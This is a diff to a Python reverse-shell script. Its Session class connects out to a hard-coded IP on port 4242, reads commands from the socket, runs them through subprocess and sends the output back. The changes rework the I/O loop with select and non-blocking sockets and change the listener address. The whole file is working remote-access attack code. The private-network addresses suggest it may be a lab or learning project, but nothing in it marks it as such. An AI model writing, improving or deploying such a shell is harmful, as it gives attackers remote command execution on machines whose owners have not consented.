@@ -1,8 +1,9 @@
 import socket
 import subprocess
 import json
+import select
 
-BUFFER_SIZE = 1024
+BUFFER_SIZE = 4096
 MESSAGE = 'echo Hola, mundo!'
 
 
@@ -24,19 +25,17 @@ class Session():
         return False
 
     def handle_io(self):
+        self.socket.setblocking(False)
         while True:
-            self.socket.setblocking(0)
-            try:    
+            rs, ws, _ = select.select([self.socket], [self.socket], [])
+            if rs:
                 self.recv_cmd()
-                if self.parse_cmd():
-                    output = self.exec_internal_cmd()
-                else:
-                    output = self.exec_cmd()
-                self.socket.sendall(output.output.encode('utf-8'))
-            except(BlockingIOError):
-                pass
-            
-
+                if ws:
+                    if self.parse_cmd():
+                        output = self.exec_internal_cmd()
+                    else:
+                        output = self.exec_cmd()
+                    self.socket.sendall(output.stdout)
 
     def exec_internal_cmd(self):
         print("InternalCMD")
@@ -64,11 +63,14 @@ class Session():
 
     def recv_cmd(self):
         self.chunks = []
-        while True:
-            self.bytes = self.socket.recv(self.bufs)
-            print("checkpoint")
-            self.chunks.append(self.bytes)
-            print(self.bytes)
+        try:
+            while True:
+                self.bytes = self.socket.recv(self.bufs)
+                print("checkpoint")
+                self.chunks.append(self.bytes)
+                print(self.bytes)
+        except(BlockingIOError):
+            pass
 
 
     def reverse_shell(self):
@@ -82,6 +84,7 @@ class Session():
             self.socket.connect(self.address)
             print("connected")   
             self.handle_io()
+            self.socket.close()
 
             # while True:
             #     self.chunks = []
@@ -103,5 +106,5 @@ class Session():
         except (TimeoutError):
             raise TimeoutError
 
-session = Session("192.168.4.1", 4242)
+session = Session("192.168.4.132", 4242)
 session.connect()
